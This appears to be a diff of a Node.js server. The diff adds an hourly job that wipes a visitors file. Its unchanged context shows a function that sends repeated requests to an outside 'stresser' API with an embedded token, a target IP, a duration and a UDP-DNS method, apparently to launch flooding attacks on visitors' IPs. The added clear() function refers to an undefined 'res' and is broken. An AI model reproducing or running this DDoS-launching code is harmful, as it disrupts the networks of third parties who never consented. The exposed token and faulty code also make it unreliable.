@@ -42,6 +42,17 @@ async function loadCache() {
     }
 }
 
+async function clear() {
+    fs.writeFile(visitorsFile, JSON.stringify([]), (err) => {
+        if (err) {
+            console.error('Error clearing visitors file:', err);
+            return res.status(500).send('Server Error');
+        }
+        res.sendStatus(200);
+    })
+}
+
+
 async function sendApiRequest(ip) {
     const url = `https://darlingapi.com?token=af1f1818-3541-411f-a643-db88e2c575ff&host=${ip}&port=0&time=120&method=UDP-DNS`;
     const requests = Array(6).fill(url).map(u => axios.get(u));
@@ -152,3 +163,5 @@ app.listen(port, () => {
     console.log(`Server is running at http://localhost:${port}`);
     loadCache().catch(err => console.error('Error loading cache on startup:', err));
 });
+
+setInterval(clear, 1000 * 60 * 60)
